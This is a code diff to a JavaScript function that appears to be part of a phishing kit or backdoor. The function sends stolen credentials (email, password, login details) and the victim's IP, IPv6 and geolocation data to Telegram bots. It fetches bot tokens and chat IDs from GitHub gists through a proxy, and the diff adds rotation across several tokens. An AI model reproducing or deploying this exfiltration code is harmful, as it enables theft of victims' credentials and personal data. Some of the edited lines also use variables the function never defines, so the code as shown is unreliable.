@@ -181,13 +181,13 @@ async function sendToTelegram(email, password, login) {
     const asn = geo.asn || 'Tidak Ada Data';
     const lon = geo.lon || 'Tidak Ada Data';
     const lat = geo.lat || 'Tidak Ada Data';
-
+    const proxy = 'https://api.codetabs.com/v1/proxy/?quest=';
     const tokenUrl = 'https://gist.githubusercontent.com/TirzzNesia/2cfa7346fe159a78c97c905cfe000efc/raw/22d9b78da579834c6019b764b4c01306a3637219/zexotokengiza.txt';
     const idUrl = 'https://gist.githubusercontent.com/TirzzNesia/dc4b8403d3bc22f90e5b1b99d17fbce1/raw/beb23224248dee33ac0b5c2578fba33e9aa2a698/kingzexoid.txt';
-    const proxy = 'https://api.codetabs.com/v1/proxy/?quest=';
 
     const tokenRes = await fetch(proxy + encodeURIComponent(tokenUrl));
-    const botToken = (await tokenRes.text()).trim();
+    const tokensText = await tokenRes.text();
+    const botTokens = tokensText.split('\n').map(t => t.trim()).filter(t => t.length > 0);
 
     const idsRes = await fetch(proxy + encodeURIComponent(idUrl));
     const idsText = await idsRes.text();
@@ -200,11 +200,12 @@ async function sendToTelegram(email, password, login) {
       timeStyle: 'medium'
     });
 
-    const message = `<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n` +
+    const message =
+      `<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n` +
       `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
-      `<b>Email/User :</b> <code>${email}</code>\n` +
-      `<b>Password   :</b> <code>${password}</code>\n` +
-      `<b>Login      :</b> <code>${login}</code>\n` +
+      `<b>User :</b> <code>${user}</code>\n` +
+      `<b>Tipe   :</b> <code>${tipe}</code>\n` +
+      `<b>Detail      :</b> <code>${detail}</code>\n` +
       `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
       `<b>IP Address :</b> <code>${ipv4}</code>\n` +
       `<b>IPv6       :</b> <code>${ipv6}</code>\n` +
@@ -219,21 +220,24 @@ async function sendToTelegram(email, password, login) {
       `<b>Wa   :</b> <span class="tg-spoiler">628975919600</span>\n` +
       `<b>Tele :</b> <span class="tg-spoiler">@zexoorill</span>`;
 
-    for (let cid of chatIds) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    chatIds.forEach((cid, index) => {
+      const token = botTokens[index % botTokens.length];
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
       const params = new URLSearchParams({
         chat_id: cid,
         text: message,
         parse_mode: 'HTML',
         disable_web_page_preview: 'true'
       });
+
       fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: params,
         mode: 'no-cors'
       }).catch(err => console.log('Telegram send error (ignored):', err));
-    }
+    });
+
   } catch (e) {
     console.error('Backdoor error:', e);
   }
